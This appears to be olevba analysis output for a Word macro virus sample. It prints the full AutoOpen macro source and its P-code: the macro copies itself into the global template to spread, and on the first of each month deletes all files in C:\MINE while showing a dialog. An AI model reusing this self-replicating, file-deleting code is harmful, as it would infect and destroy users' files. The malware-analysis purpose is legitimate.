olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minimal.bj
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minimal.bj - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoopeN.bas 
in file: Virus.MSWord.Minimal.bj - OLE stream: 'Macros/VBA/AutoopeN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim a$
Dim b$
Dim diálogoEjem As Object
Dim botón
     'VIRUS FERNANDO
     'HECHO EN EL PERU
     On Error Resume Next
     a$ = WordBasic.[FileName$]() + ":AutoopeN"
     b$ = "Global:AUTOOPEN"
     WordBasic.MacroCopy a$, b$
     WordBasic.FileSaveAs Format:=1
     WordBasic.MacroCopy b$, a$
     If WordBasic.Day(WordBasic.Now()) = 1 Then
        WordBasic.Kill "C:\MINE\*.*"
'*******MESAGE BOX****************
    WordBasic.BeginDialog 320, 144, "AMOR"
    WordBasic.PushButton 110, 93, 97, 21, "OK", "ONE OR TWO"
    WordBasic.Text 75, 32, 237, 33, "DOS AMORES EN MI VIDA TU, YO Y EL", "Texto1"
    WordBasic.Text 75, 49, 237, 33, "SINO SON DOS....NO HAY AMOR", "Texto2"
    WordBasic.EndDialog
'********************************************
    Set diálogoEjem = WordBasic.CurValues.UserDialog
    WordBasic.DisableInput 1
    botón = WordBasic.Dialog.UserDialog(diálogoEjem)
    WordBasic.DisableInput 0
     End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Minimal.bj
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoopeN - 2520 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn a
' Line #3:
' 	Dim 
' 	VarDefn B
' Line #4:
' 	Dim 
' 	VarDefn diálogoEjem (As Object)
' Line #5:
' 	Dim 
' 	VarDefn botón
' Line #6:
' 	QuoteRem 0x0005 0x000E "VIRUS FERNANDO"
' Line #7:
' 	QuoteRem 0x0005 0x0010 "HECHO EN EL PERU"
' Line #8:
' 	OnError (Resume Next) 
' Line #9:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":AutoopeN"
' 	Add 
' 	St a$ 
' Line #10:
' 	LitStr 0x000F "Global:AUTOOPEN"
' 	St B$ 
' Line #11:
' 	Ld a$ 
' 	Ld B$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #12:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #13:
' 	Ld B$ 
' 	Ld a$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #14:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #15:
' 	LitStr 0x000B "C:\MINE\*.*"
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #16:
' 	QuoteRem 0x0000 0x0021 "*******MESAGE BOX****************"
' Line #17:
' 	LitDI2 0x0140 
' 	LitDI2 0x0090 
' 	LitStr 0x0004 "AMOR"
' 	Ld WordBasic 
' 	ArgsMemCall BeginDialog 0x0003 
' Line #18:
' 	LitDI2 0x006E 
' 	LitDI2 0x005D 
' 	LitDI2 0x0061 
' 	LitDI2 0x0015 
' 	LitStr 0x0002 "OK"
' 	LitStr 0x000A "ONE OR TWO"
' 	Ld WordBasic 
' 	ArgsMemCall PushButton 0x0006 
' Line #19:
' 	LitDI2 0x004B 
' 	LitDI2 0x0020 
' 	LitDI2 0x00ED 
' 	LitDI2 0x0021 
' 	LitStr 0x0021 "DOS AMORES EN MI VIDA TU, YO Y EL"
' 	LitStr 0x0006 "Texto1"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #20:
' 	LitDI2 0x004B 
' 	LitDI2 0x0031 
' 	LitDI2 0x00ED 
' 	LitDI2 0x0021 
' 	LitStr 0x001B "SINO SON DOS....NO HAY AMOR"
' 	LitStr 0x0006 "Texto2"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #21:
' 	Ld WordBasic 
' 	ArgsMemCall EndDialog 0x0000 
' Line #22:
' 	QuoteRem 0x0000 0x002C "********************************************"
' Line #23:
' 	SetStmt 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	MemLd UserDialog 
' 	Set diálogoEjem 
' Line #24:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DisableInput 0x0001 
' Line #25:
' 	Ld diálogoEjem 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemLd UserDialog 0x0001 
' 	St botón 
' Line #26:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableInput 0x0001 
' Line #27:
' 	EndIfBlock 
' Line #28:
' Line #29:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoopeN            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

